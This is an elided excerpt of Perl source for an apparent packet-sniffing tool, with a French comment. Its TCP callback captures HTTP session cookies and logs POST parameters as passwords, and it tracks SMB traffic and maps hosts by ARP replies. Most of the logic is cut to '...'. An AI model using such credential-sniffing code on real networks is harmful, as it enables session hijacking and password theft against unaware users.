...
sub Start_NetworkListener_Thread
{
        ...
        my $npe = Net::Pcap::Easy->new(
            ...
            tcp_callback => sub {
                    ...
                    foreach my $line (@data)
                    {
                        ...
                        if ($log == 1)
                        {
                            ...
                            if ($line =~ m/Cookie: /)
                            {
                                ...
                                AddLogInfo("Session Cookie captured ! http://".$httpown_host.$httpown_page."\r\n");
                ...
                if ($tcp->{dest_port} == "80" && 1 ~~ @Settings){
                    ...
                    elsif ($datasrc and $datasrc eq $tcp->{src_port})
                    {
                        ...
                        foreach my $data (@tmp){
                            ...
                            AddPassword("[$host] [HTTP/POST] Parameter : ".$data."");
                        }
                        $datasrc = 0;
                    }
                ...
                elsif ($tcp->{dest_port} == 445 || $tcp->{src_port} == 139 || $tcp->{src_port} == 445)
                {
                    my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
            ...
            arp_callback => sub {
                ...
                #On ajoute l'IP source et l'adresse AC quand un packet ARP Reply est capturé.
                if ($arp->{opcode} == 2)
                {
                    ...
                    if (!$ResolvedHosts{$ipsrc})
                    {
                        ...
                        AddLogInfo("hwaddr=$macsrc [ ".LookupMacVendor($macsrc)." ], " .
